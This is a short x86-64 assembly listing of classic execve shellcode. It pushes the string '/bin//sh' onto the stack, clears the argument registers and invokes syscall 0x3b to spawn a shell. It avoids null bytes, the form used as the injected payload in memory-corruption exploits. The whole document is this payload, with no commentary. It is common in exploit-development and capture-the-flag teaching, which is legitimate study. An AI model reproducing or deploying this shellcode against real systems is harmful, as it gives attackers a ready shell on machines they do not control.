	.global _start

	.text
_start:
    pushq 	%rax
    movq 	$0x68732f2f6e69622f, %rbx  
   	pushq	%rbx
    xorq 	%rdx,%rdx
    xorq 	%rsi,%rsi  
    pushq 	%rsp
    popq 	%rdi
    movb 	$0x3b, %al
    syscall


